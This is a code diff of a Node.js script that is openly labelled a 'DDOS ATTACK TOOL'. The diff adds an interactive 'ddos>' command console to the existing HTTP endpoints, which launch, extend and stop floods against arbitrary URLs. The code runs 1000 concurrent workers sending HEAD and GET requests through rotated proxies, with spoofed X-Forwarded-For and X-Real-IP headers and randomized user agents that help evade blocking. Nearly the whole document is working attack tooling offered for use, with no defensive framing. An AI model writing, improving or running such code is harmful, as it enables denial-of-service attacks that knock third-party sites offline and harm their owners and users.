@@ -5,24 +5,25 @@ const path = require("path");
 const { SocksProxyAgent } = require("socks-proxy-agent");
 const { HttpsProxyAgent } = require("https-proxy-agent");
 const { rainbow } = require("gradient-string");
+const readline = require("readline");
 
 const app = express();
 app.use(express.json());
 
 const stateFilePath = path.join(__dirname, "attackState.json");
+const REQUESTS_PER_THREAD = 3;
+const numThreads = 1000;
+let totalRequestsSent = 0;
+let batchDurations = [];
 
-// Configuration
-const REQUESTS_PER_THREAD = 3; // Number of requests per thread per batch
-const numThreads = 1000; // Number of threads
-let totalRequestsSent = 0; // Counter for total successful requests
-let batchDurations = []; // Array to store batch durations for dynamic estimation
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout
+});
 
 const ensureStateFileExists = () => {
   if (!fs.existsSync(stateFilePath)) {
-    fs.writeFileSync(
-      stateFilePath,
-      JSON.stringify({ continueAttack: false, sessions: [] })
-    );
+    fs.writeFileSync(stateFilePath, JSON.stringify({ continueAttack: false, sessions: [] }));
   }
 };
 
@@ -41,7 +42,6 @@ let state = loadState();
 let continueAttack = state.continueAttack;
 let sessions = state.sessions || [];
 
-// Clean up expired sessions on startup
 sessions = sessions.filter((session) => {
   const endTime = session.startTime + session.duration;
   if (Date.now() > endTime) {
@@ -50,6 +50,7 @@ sessions = sessions.filter((session) => {
   }
   return true;
 });
+
 if (sessions.length === 0) {
   continueAttack = false;
 }
@@ -112,10 +113,7 @@ const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");
 
 const userAgents = () => {
   try {
-    return fs
-      .readFileSync(ualist, "utf-8")
-      .split("\n")
-      .map((line) => line.trim());
+    return fs.readFileSync(ualist, "utf-8").split("\n").map((line) => line.trim());
   } catch (error) {
     console.error(`Failed to read user agent list: ${error}`);
     return [];
@@ -124,10 +122,7 @@ const userAgents = () => {
 
 const loadProxies = () => {
   try {
-    return fs
-      .readFileSync(proxyFilePath, "utf-8")
-      .split("\n")
-      .map((line) => line.trim());
+    return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map((line) => line.trim());
   } catch {
     return [];
   }
@@ -135,25 +130,17 @@ const loadProxies = () => {
 
 const estimateTotalRequests = (durationHours) => {
   const durationSeconds = durationHours * 60 * 60;
-  const requestsPerBatch =
-    numThreads * REQUESTS_PER_THREAD * 2 * sessions.length; // HEAD + GET for each active session
-  const avgBatchDuration =
-    batchDurations.length > 0
-      ? batchDurations.reduce((sum, duration) => sum + duration, 0) /
-        batchDurations.length /
-        1000
-      : 1;
+  const requestsPerBatch = numThreads * REQUESTS_PER_THREAD * 2 * sessions.length;
+  const avgBatchDuration = batchDurations.length > 0 ? batchDurations.reduce((sum, duration) => sum + duration, 0) / batchDurations.length / 1000 : 1;
   const totalBatches = durationSeconds / avgBatchDuration;
   return Math.round(totalBatches * requestsPerBatch);
 };
 
 const performAttack = async (sessions, agent, threadId) => {
   if (!continueAttack || sessions.length === 0) {
-    console.log(rainbow(`Thread ${threadId}: Stopped.`));
     return;
   }
 
-  // Filter active sessions
   const activeSessions = sessions.filter((session) => {
     const endTime = session.startTime + session.duration;
     return Date.now() <= endTime;
@@ -163,9 +150,6 @@ const performAttack = async (sessions, agent, threadId) => {
     continueAttack = false;
     state = { continueAttack: false, sessions: [] };
     fs.writeFileSync(stateFilePath, JSON.stringify(state));
-    console.log(
-      rainbow(`Thread ${threadId}: Stopped due to all sessions expired.`)
-    );
     return;
   }
 
@@ -193,15 +177,10 @@ const performAttack = async (sessions, agent, threadId) => {
       TE: "Trailers",
       "Accept-Encoding": "gzip, deflate, br",
       Pragma: getRandomElement(cipherSuites),
-      "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(
-        Math.random() * 256
-      )}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
+      "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
       Via: `1.1 ${Math.random().toString(36).substring(7)}`,
-      "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(
-        Math.random() * 256
-      )}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
-      "Sec-Ch-UA":
-        '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+      "X-Real-IP": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`,
+      "Sec-Ch-UA": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
       Host: url.replace(/https?:\/\//, "").split("/")[0],
       "sec-fetch-site": "same-origin",
       "Sec-Fetch-User": "?1",
@@ -210,87 +189,37 @@ const performAttack = async (sessions, agent, threadId) => {
 
     const requests = Array.from({ length: REQUESTS_PER_THREAD }, () => [
       axios.head(url, { httpAgent: agent, headers: headersForRequest }),
-      axios.get(url, {
-        httpAgent: agent,
-        headers: headersForRequest,
-        timeout: 0,
-      }),
+      axios.get(url, { httpAgent: agent, headers: headersForRequest, timeout: 0 }),
     ]).flat();
 
     try {
       const results = await Promise.allSettled(
         requests.map((request) =>
           request.catch((err) => {
-            if (
-              err.code === "ECONNRESET" ||
-              err.code === "ECONNREFUSED" ||
-              err.code === "EHOSTUNREACH" ||
-              err.code === "ETIMEDOUT" ||
-              err.code === "EAI_AGAIN" ||
-              err.message === "Socket is closed"
-            ) {
-              // console.log(rainbow(`Thread ${threadId}: Network error on ${url}: ${err.code || err.message} (Possible proxy issue)`));
-            } else if (err.response?.status === 404) {
-              console.log(
-                rainbow(
-                  `Thread ${threadId}: Target ${url} returned 404 (Not Found).`
-                )
-              );
+            if (err.response?.status === 404) {
+              console.log(rainbow(`Thread ${threadId}: Target ${url} returned 404`));
             } else if (err.response?.status === 503) {
-              console.log(
-                rainbow(
-                  `Thread ${threadId}: Target ${url} under heavy load (503) - Game Over!`
-                )
-              );
+              console.log(rainbow(`Thread ${threadId}: Target ${url} under heavy load (503)`));
             } else if (err.response?.status === 502) {
-              console.log(
-                rainbow(`Thread ${threadId}: Bad Gateway (502) on ${url}.`)
-              );
+              console.log(rainbow(`Thread ${threadId}: Bad Gateway (502) on ${url}.`));
             } else if (err.response?.status === 403) {
-              console.log(
-                rainbow(`Thread ${threadId}: Forbidden (403) on ${url}.`)
-              );
-            } else if (err.response?.status) {
-              console.log(
-                rainbow(
-                  `Thread ${threadId}: HTTP Status on ${url}: ${err.response.status}`
-                )
-              );
-            } else {
-              console.log(
-                rainbow(
-                  `Thread ${threadId}: Error on ${url}: ${
-                    err.message || "Unknown error"
-                  }`
-                )
-              );
+              console.log(rainbow(`Thread ${threadId}: Forbidden (403) on ${url}.`));
             }
             return null;
           })
         )
       );
 
-      successfulRequests += results.filter(
-        (result) => result.status === "fulfilled" && result.value
-      ).length;
-    } catch (err) {
-      // console.error(rainbow(`Thread ${threadId}: Batch failed for ${url}: ${err.message}`));
-    }
+      successfulRequests += results.filter((result) => result.status === "fulfilled" && result.value).length;
+    } catch (err) {}
   }
 
   const batchDuration = Date.now() - batchStartTime;
   batchDurations.push(batchDuration);
   totalRequestsSent += successfulRequests;
 
-  if (successfulRequests > 0) {
-    console.log(
-      rainbow(
-        `Thread ${threadId}: Completed batch of ${successfulRequests} successful requests ` +
-          `(Total sent: ${totalRequestsSent.toLocaleString()}) in ${(
-            batchDuration / 1000
-          ).toFixed(2)} seconds`
-      )
-    );
+  if (successfulRequests > 0 && threadId === 0) {
+    console.log(rainbow(`[${new Date().toLocaleTimeString()}] Batch: ${successfulRequests} requests | Total: ${totalRequestsSent.toLocaleString()}`));
   }
 
   if (continueAttack) {
@@ -300,15 +229,13 @@ const performAttack = async (sessions, agent, threadId) => {
 
 const startAttack = (url, durationHours) => {
   if (!url || !/^https?:\/\//.test(url)) {
-    console.error(
-      "Invalid URL. Please provide a valid URL starting with http:// or https://"
-    );
+    console.log(rainbow("Invalid URL. Please provide a valid URL starting with http:// or https://"));
     return false;
   }
 
   const proxies = loadProxies();
   if (!proxies.length) {
-    console.error("No proxies found. Please add proxies to the proxy file.");
+    console.log(rainbow("No proxies found. Please add proxies to the proxy file."));
     return false;
   }
 
@@ -323,20 +250,8 @@ const startAttack = (url, durationHours) => {
   state = { continueAttack, sessions };
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
-  const estimatedRequests = estimateTotalRequests(durationHours);
-  console.log(
-    rainbow(
-      `🚀 Starting Attack 🚀\n` +
-        `New Target: ${url}\n` +
-        `Active Targets: ${sessions.map((s) => s.url).join(", ")}\n` +
-        `Duration for New Session: ${durationHours} hour(s)\n` +
-        `Threads: ${numThreads}\n` +
-        `Requests per Thread per Batch: ${
-          REQUESTS_PER_THREAD * 2 * sessions.length
-        } (HEAD + GET per URL)\n` +
-        `Estimated Total Requests: ${estimatedRequests.toLocaleString()}`
-    )
-  );
+  console.log(rainbow(`\n🚀 Attack Started on ${url} for ${durationHours} hour(s)`));
+  console.log(rainbow(`Active targets: ${sessions.length}`));
 
   for (let i = 0; i < numThreads; i++) {
     if (!continueAttack) break;
@@ -345,14 +260,146 @@ const startAttack = (url, durationHours) => {
     const proxyParts = randomProxy.split(":");
     const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
     const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
-    const agent =
-      proxyProtocol === "socks5"
-        ? new SocksProxyAgent(proxyUrl)
-        : new HttpsProxyAgent(proxyUrl);
+    const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
 
     performAttack(sessions, agent, i);
   }
   return true;
+};
+
+const stopAttack = () => {
+  if (!continueAttack) {
+    console.log(rainbow("No active attack to stop."));
+    return;
+  }
+
+  continueAttack = false;
+  state = { continueAttack: false, sessions: [] };
+  fs.writeFileSync(stateFilePath, JSON.stringify(state));
+
+  console.log(rainbow(`\n🛑 Attack Stopped`));
+  console.log(rainbow(`Total Requests Sent: ${totalRequestsSent.toLocaleString()}`));
+};
+
+const showStatus = () => {
+  if (!continueAttack || sessions.length === 0) {
+    console.log(rainbow("No active attacks running."));
+    return;
+  }
+
+  const activeSessions = sessions.filter((s) => Date.now() <= s.startTime + s.duration);
+  
+  console.log(rainbow("\n=== Attack Status ==="));
+  activeSessions.forEach((s) => {
+    const remainingMs = s.startTime + s.duration - Date.now();
+    const remainingHours = (remainingMs / (60 * 60 * 1000)).toFixed(2);
+    console.log(rainbow(`Target: ${s.url} | Remaining: ${remainingHours} hours`));
+  });
+  console.log(rainbow(`Total Requests: ${totalRequestsSent.toLocaleString()}`));
+  console.log(rainbow(`Threads: ${numThreads}`));
+};
+
+const showHelp = () => {
+  console.log(rainbow("\n=== Available Commands ==="));
+  console.log(rainbow("start <url> [hours]  - Start attack (default 1 hour)"));
+  console.log(rainbow("stop                 - Stop all attacks"));
+  console.log(rainbow("status               - Show attack status"));
+  console.log(rainbow("add <url> [hours]    - Add new target"));
+  console.log(rainbow("remove <url>         - Remove target"));
+  console.log(rainbow("clear                - Clear console"));
+  console.log(rainbow("help                 - Show this help"));
+  console.log(rainbow("exit                 - Exit program\n"));
+};
+
+const clearConsole = () => {
+  console.clear();
+};
+
+const handleCommand = (cmd) => {
+  const parts = cmd.trim().split(/\s+/);
+  const command = parts[0].toLowerCase();
+  const args = parts.slice(1);
+
+  switch(command) {
+    case "start":
+      if (args.length < 1) {
+        console.log(rainbow("Usage: start <url> [hours]"));
+        return;
+      }
+      const url = args[0];
+      const hours = args[1] ? parseFloat(args[1]) : 1;
+      startAttack(url, hours);
+      break;
+
+    case "add":
+      if (args.length < 1) {
+        console.log(rainbow("Usage: add <url> [hours]"));
+        return;
+      }
+      const addUrl = args[0];
+      const addHours = args[1] ? parseFloat(args[1]) : 1;
+      
+      if (!continueAttack) {
+        console.log(rainbow("No active attack. Start one first with 'start' command."));
+        return;
+      }
+      
+      const newSession = {
+        url: addUrl,
+        startTime: Date.now(),
+        duration: addHours * 60 * 60 * 1000,
+      };
+      sessions.push(newSession);
+      state = { continueAttack, sessions };
+      fs.writeFileSync(stateFilePath, JSON.stringify(state));
+      console.log(rainbow(`Added target: ${addUrl} for ${addHours} hours`));
+      break;
+
+    case "remove":
+      if (args.length < 1) {
+        console.log(rainbow("Usage: remove <url>"));
+        return;
+      }
+      const removeUrl = args[0];
+      const initialLength = sessions.length;
+      sessions = sessions.filter((s) => s.url !== removeUrl);
+      
+      if (sessions.length === initialLength) {
+        console.log(rainbow(`Target ${removeUrl} not found`));
+      } else {
+        if (sessions.length === 0) continueAttack = false;
+        state = { continueAttack, sessions };
+        fs.writeFileSync(stateFilePath, JSON.stringify(state));
+        console.log(rainbow(`Removed target: ${removeUrl}`));
+      }
+      break;
+
+    case "stop":
+      stopAttack();
+      break;
+
+    case "status":
+      showStatus();
+      break;
+
+    case "clear":
+      clearConsole();
+      break;
+
+    case "help":
+      showHelp();
+      break;
+
+    case "exit":
+      console.log(rainbow("Goodbye!"));
+      rl.close();
+      process.exit(0);
+      break;
+
+    default:
+      if (command) console.log(rainbow(`Unknown command: ${command}`));
+      showHelp();
+  }
 };
 
 app.get("/stresser", (req, res) => {
@@ -360,120 +407,59 @@ app.get("/stresser", (req, res) => {
   const durationHours = parseFloat(req.query.duration) || 1;
 
   if (!url || !/^https?:\/\//.test(url)) {
-    return res
-      .status(400)
-      .json({
-        error:
-          "Invalid URL. Please provide a valid URL starting with http:// or https://.",
-      });
-  }
-  if (isNaN(durationHours) || durationHours <= 0) {
-    return res
-      .status(400)
-      .json({
-        error: "Invalid duration. Please provide a positive duration in hours.",
-      });
+    return res.status(400).json({ error: "Invalid URL" });
   }
 
-  // Check if the URL is already in an active session
-  const isUrlActive = sessions.some(
-    (session) => session.url === url && Date.now() <= session.startTime + session.duration
-  );
-  if (isUrlActive) {
-    return res
-      .status(400)
-      .json({
-        error: `The URL ${url} is already being targeted in an active attack session.`,
-      });
-  }
-
-  res.json({
-    message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${
-      REQUESTS_PER_THREAD * 2 * (sessions.length + 1)
-    } requests per batch to ${url} and existing targets.`,
-  });
+  res.json({ message: `Starting attack on ${url}` });
   startAttack(url, durationHours);
 });
 
 app.get("/stop", (req, res) => {
-  if (!continueAttack) {
-    return res.json({ message: "No active attack to stop." });
-  }
-
-  continueAttack = false;
-  state = { continueAttack: false, sessions: [] };
-  fs.writeFileSync(stateFilePath, JSON.stringify(state));
-
-  res.json({
-    message: `Attack stopped. Targets彼此  Targets: ${sessions
-      .map((s) => s.url)
-      .join(", ")}, Total Requests Sent: ${totalRequestsSent.toLocaleString()}`,
-  });
-  console.log(
-    rainbow(
-      `🛑 Attack Stopped Manually 🛑\n` +
-        `Targets: ${sessions.map((s) => s.url).join(", ")}\n` +
-        `Total Requests Sent: ${totalRequestsSent.toLocaleString()}`
-    )
-  );
-  process.exit(0);
+  stopAttack();
+  res.json({ message: "Attack stopped" });
 });
 
-const port =
-  process.env.PORT ||
-  25694 ||
-  Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
+app.get("/status", (req, res) => {
+  res.json({
+    active: continueAttack,
+    targets: sessions.map(s => s.url),
+    totalRequests: totalRequestsSent
+  });
+});
+
+const port = process.env.PORT || 25694;
 app.listen(port, () => {
-  console.log(rainbow(`API running on http://localhost:${port}`));
+  console.clear();
+  console.log(rainbow("╔══════════════════════════════════════╗"));
+  console.log(rainbow("║         DDOS ATTACK TOOL v1.0        ║"));
+  console.log(rainbow("╚══════════════════════════════════════╝"));
+  console.log(rainbow(`API: http://localhost:${port}`));
+  console.log(rainbow("Type 'help' for available commands\n"));
+  
+  rl.setPrompt(rainbow("ddos> "));
+  rl.prompt();
+
+  rl.on("line", (input) => {
+    handleCommand(input);
+    rl.prompt();
+  });
+
   if (continueAttack && sessions.length > 0) {
     console.log(rainbow("Resuming previous attack..."));
-    const activeSessions = sessions.filter(
-      (session) => Date.now() <= session.startTime + session.duration
-    );
+    const activeSessions = sessions.filter((session) => Date.now() <= session.startTime + session.duration);
     if (activeSessions.length > 0) {
       sessions = activeSessions;
       state = { continueAttack, sessions };
       fs.writeFileSync(stateFilePath, JSON.stringify(state));
-      const maxRemainingDuration = Math.max(
-        ...sessions.map(
-          (s) => (s.startTime + s.duration - Date.now()) / (60 * 60 * 1000)
-        )
-      );
-      const estimatedRequests = estimateTotalRequests(maxRemainingDuration);
-      console.log(
-        rainbow(
-          `🔄 Resuming Attack 🔄\n` +
-            `Active Targets: ${sessions.map((s) => s.url).join(", ")}\n` +
-            `Max Remaining Duration: ${maxRemainingDuration.toFixed(
-              2
-            )} hour(s)\n` +
-            `Threads: ${numThreads}\n` +
-            `Requests per Thread per Batch: ${
-              REQUESTS_PER_THREAD * 2 * sessions.length
-            } (HEAD + GET per URL)\n` +
-            `Estimated Total Requests: ${estimatedRequests.toLocaleString()}`
-        )
-      );
+      
       for (let i = 0; i < numThreads; i++) {
         const randomProxy = getRandomElement(loadProxies());
         const proxyParts = randomProxy.split(":");
-        const proxyProtocol = proxyParts[0].startsWith("socks")
-          ? "socks5"
-          : "http";
+        const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
         const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
-        const agent =
-          proxyProtocol === "socks5"
-            ? new SocksProxyAgent(proxyUrl)
-            : new HttpsProxyAgent(proxyUrl);
+        const agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
         performAttack(sessions, agent, i);
       }
-    } else {
-      continueAttack = false;
-      state = { continueAttack: false, sessions: [] };
-      fs.writeFileSync(stateFilePath, JSON.stringify(state));
-      console.log(
-        rainbow(`Attack stopped: All sessions expired for previous attack.`)
-      );
     }
   }
 });
